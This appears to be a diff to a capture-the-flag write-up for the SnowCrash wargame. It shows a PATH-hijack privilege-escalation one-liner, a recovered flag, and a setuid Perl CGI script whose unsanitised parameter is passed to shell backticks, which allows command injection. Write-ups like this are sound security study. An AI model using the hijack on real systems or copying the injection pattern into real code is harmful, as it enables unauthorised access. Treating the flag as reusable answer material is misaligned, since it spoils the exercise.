@@ -109,3 +109,24 @@ echo "/bin/bash" > /tmp/echo && chmod 777 /tmp/echo && export PATH=/tmp:$PATH &&
 ```
 
 Flag: `qi0maab88jeaj46qoumi7maus`
+
+## Level04:
+
+```bash
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+level04@SnowCrash:~$
+```
+
+```perl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
